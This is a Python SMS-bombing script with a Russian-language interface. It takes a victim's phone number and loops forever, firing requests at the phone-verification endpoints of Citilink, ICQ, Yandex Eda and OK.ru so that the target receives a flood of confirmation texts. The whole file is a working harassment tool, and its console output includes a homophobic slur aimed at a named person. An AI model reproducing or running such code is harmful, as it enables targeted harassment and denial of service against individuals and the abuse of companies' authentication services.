#-= It's just illusion =-#

import requests
from threading import Thread
import random
from termcolor import colored
import time

print(colored('''
╋╋╋╋╋╋╋╋╋╋╋┏┓
╋╋╋╋╋╋╋╋╋╋╋┃┃
┏━━┳━┳━━┳━━┫┗━┓
┃┏┓┃┏┫┏┓┃━━┫┏┓┃
┃┗┛┃┃┃┏┓┣━━┃┃┃┃
┗━┓┣┛┗┛┗┻━━┻┛┗┛
┏━┛┃
┗━━┛
''', 'red'), colored('\nBeta 0.1', 'cyan'))

phone = input(colored('Ведите номер телефона>>: ','red'))
countT = input(colored('Enter threading>>: ','blue'))
print("\nЧто бы отменить нажмите Ctrl + C\n\nТима кстати пидорас)")

#Привожу к виду +7xxxxxxxxx
if " " in phone:
	phone = phone.replace(" ", "")
if phone[0] != "+":
	if phone[0]== "8":
		phone = phone.replace("8", "+7", 1)
	else:
		phone = "+7" + phone


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	count = 0
	while True:
		request_timeout = 0.00001
		_phone = phone

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/'+_phone+'/')
			count += 1
			print(colored('Citilink отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('Citilink  не отправлено!', 'red'))

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			count += 1
			print(colored('ICQ отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('ICQ Не отправлено!', 'red'))

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			count += 1
			print(colored('Eda.Yandex отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('Eda.Yandex Не отправлено!', 'red'))

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			count += 1
			print(colored('OK отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('OK Не отправлено!', 'red'))

		print(colored('Список дошёл до конца', 'magenta'))
		time.sleep(10)

countT = Thread(target=infinity)
countT.start()
